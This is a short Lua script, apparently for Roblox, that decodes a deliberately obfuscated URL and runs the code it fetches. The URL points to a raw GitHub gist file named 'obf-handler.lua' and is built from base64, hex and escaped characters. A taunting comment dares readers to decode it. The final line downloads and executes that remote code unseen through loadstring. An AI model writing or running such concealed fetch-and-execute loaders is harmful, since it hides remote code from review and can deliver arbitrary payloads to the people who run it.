-- hey you, yes you
-- good luck! :3

local webhold = {
    ["name"] = "github";
    ["type"] = "raw";
    ["file-type"] = "lua";
}

function decodeink(data, autolaunch, mode)
    local mode = mode or 2
    if mode == 1 then
    local result = ""
    for i = 1, #data, 2 do
        local byte_str = data:sub(i, i+1)
        local byte = tonumber(byte_str, 16)
        if byte then
            result = result .. string.char(byte)
        else
            result = result .. "?"
        end
    end
    if autolaunch == true then
        pcall(function()
        loadstring(result)()
        end)
    end
    return result
    elseif mode == 2 then
    local autolaunch = autolaunch or false
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    local decoded = (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
    if autolaunch == true then
        pcall(function()
        loadstring(decoded)()
        end)
    end
    return decoded
    end
end

api_decode = function(api_keys)
if not api_keys then return nil end
local data = api_keys
return ""..decodeink("aHR0cHM=", false, 2).."://"..loadstring('return "\103\105\115\116"')().."."..webhold["name"]..""..decodeink("75736572636F6E74656E742E636F6D2F50726F36363650726F", false, 1)..""..tostring(data[1]).."\47"..webhold["type"].."\47"..tostring(data[2]).."\47"..tostring(data[3])..""
end

return loadstring(game:HttpGet(tostring(api_decode({[1]="81253c\48\56\55\52c84e33b5ae5c70a\99\50\57eaa9";[2]="\51\51"..loadstring('return "cf9f"')().."\50\49\98\97\102ea\100\51\52\102\56\57\49\54\97f114becaadc73\52\57\51\52";[3]="obf-handler."..webhold["file-type"].."";}))))()
